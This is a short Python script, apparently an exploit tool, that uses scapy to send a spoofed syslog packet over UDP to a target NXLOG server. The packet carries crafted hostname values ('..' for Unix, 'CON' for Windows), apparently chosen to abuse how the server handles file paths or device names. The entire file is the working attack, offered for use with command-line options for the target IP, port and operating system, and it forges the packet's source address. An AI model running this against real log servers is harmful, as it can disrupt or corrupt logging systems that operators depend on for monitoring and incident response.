#!/usr/bin/python3
# coding: utf8
# Nooooooooooo I'm not a script kiddie I hack syslog :D
# g0 h4ck SYSLOG
# Made by 123soleil with <3

import sys
import time
import argparse
from scapy.all import *

def getPayload(args):
        # IF UNIX
        if (args.OS == 1):
                return "Sep 14 14:09:09 .. dhcp service[warning] 110 Silence is golden"
        # IF WINDOWS
        elif (args.OS == 2):
                return "Sep 14 14:09:09 CON dhcp service[warning] 110 Silence is golden"

        # Test
        elif (args.OS == 3):
                return "Sep 14 14:09:09 123soleil dhcp service[warning] 110 Silence is golden"

def runExploit(args,payload):
        priority = 30
        message = payload
        syslog = IP(src="192.168.1.10",dst=args.IP)/UDP(sport=666,dport=args.PORT)/Raw(load="<" + str(priority) + ">" + message)
        send(syslog,verbose=args.DEBUG)

def getArguments():
        parser = argparse.ArgumentParser(description="Go h@ck SYSLOG")
        parser.add_argument("-ip", "-IP", dest="IP", type=str, metavar="IP destination", required=True,default=1, help="IP of NXLOG server")
        parser.add_argument("-p", "-P", dest="PORT", type=int, metavar="Port destination", required=False,default=514, help="Port of NXLOG default 514")
        parser.add_argument("-os", "-OS", dest="OS", type=int, metavar="OS", default=1, required=True, help="1 : For unix payload \n 2 : For Windows Paylaod \n 3 : Just for test")
        parser.add_argument("-d", "-D", dest="DEBUG", type=int, metavar="DEBUG", default=0, required=False, help="1 : Debbug enable")
        return parser.parse_args()

def main():
        args = getArguments()
        payload = getPayload(args)
        runExploit(args,payload)
main()